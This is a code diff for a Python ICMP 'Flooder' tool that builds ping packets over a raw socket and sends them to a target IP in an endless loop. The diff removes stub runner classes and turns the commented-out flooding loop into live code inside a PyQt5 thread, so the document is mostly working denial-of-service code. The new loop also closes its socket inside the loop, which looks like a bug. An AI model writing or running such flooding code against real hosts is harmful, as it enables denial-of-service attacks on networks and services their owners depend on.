@@ -1,8 +1,5 @@
-from sys import exit
-from struct import pack
-from threading import Thread, Event, excepthook, activeCount
 from time import time, sleep
-from signal import signal, SIGINT
+from struct import pack, error
 
 from socket import (
     socket,
@@ -12,77 +9,17 @@ from socket import (
     SOCK_RAW,
     IPPROTO_ICMP
 )
-from typing import Any, Dict
-from logging import warning, exception, info
+from logging import warning, exception
 
-from PyQt5.QtCore import QThread, pyqtSignal
-
-
-class FlooderConsoleRunner(Thread):
-
-    def __init__(self, threads_number: int, arguments: Dict[str, Any]):
-        Thread.__init__(self)
-
-        self.args = arguments
-        self.threads_num = threads_number
-
-        self.all_threads = list()
-        self.flooder = Flooder(
-            ip=self.args.get('ip'),
-            port=self.args.get('port'),
-            length=self.args.get('length'),
-            frequency=self.args.get('frequency')
-        )
-
-    def run(self) -> None:
-        interrupt_event = Event()
-
-        for thread_iter in range(0, self.threads_num):
-
-            thread = Thread(
-                daemon=True,
-                target=self.flooder.run_flooding,
-                name=f'flooding-cmd-thread-{thread_iter}',
-                args=(
-                    self.args.get('ip'),
-                    self.args.get('port'),
-                    self.args.get('length'),
-                    self.args.get('frequency'),
-                )
-            )
-
-            thread.start()
-            interrupt_event.wait()
+from PyQt5 import QtCore
+from PyQt5.QtCore import QThread
 
 
-class FlooderGuiRunner(QThread):
-    finished = pyqtSignal
-
-    def __init__(self, num_threads: int, args: Dict[str, Any], parent=None):
-        QThread.__init__(self, parent)
-
-        self.args = args
-        self.all_threads = list()
-        self.num_threads = num_threads
-        self.flooder = Flooder()
-
-    def run(self) -> None:
-        for iter_thread in range(0, self.threads):
-            self.thread = QThread()
-            self.fooder = Flooder()
-                # self.args.get('ip'),
-                # self.args.get('port'),
-                # self.args.get('length'),
-                # self.args.get('frequency')
-            self.all_threads.append(self.thread)
-            self.thread.start()
-
-        [thread.quit() for thread in self.all_threads]
-
-
-class Flooder(object):
+class Flooder(QThread):
+    finish_signal = QtCore.pyqtSignal()
 
     def __init__(self, ip: str, port: int, length: int, frequency: float):
+        QThread.__init__(self, None)
 
         self.ip = ip
         self.port = port
@@ -104,30 +41,23 @@ class Flooder(object):
         header = pack("bbHHh", 8, 0, htons(self._checksum(header + data)), 1, 1)
         return header + data
 
-    def run_flooding(self) -> None:
+    def run(self) -> None:
         try:
-            # sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)
-            # inet_aton(ip)
+            sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)
+            inet_aton(self.ip)
 
-            while True: # self.running_status:
-                # packet = self._construct_packet()
-                # sock.sendto(packet, (ip, port))
-                # sleep(frequency)
-                # sock.close()
-                print('Kek')
-                sleep(1)
+            while True:
+                packet = self._construct_packet()
+                sock.sendto(packet, (self.ip, self.port))
+                sleep(self.frequency)
+                sock.close()
+
+        except error as e:
+            exception(msg=f'Error while pack: {e}')
 
         except (KeyboardInterrupt, SystemExit) as e:
             warning(msg=f'Has been interrupted closing event. Closing all available threads: {e}')
             return
 
-
-if __name__ == '__main__':
-    args = {
-        'ip':'127.0.0.1',
-        'port':80,
-        'length':10,
-        'frequency':0.5
-    }
-    t = FlooderConsoleRunner(threads_number=5, arguments=args)
-    t.run()
+        finally:
+            self.finish_signal.emit()
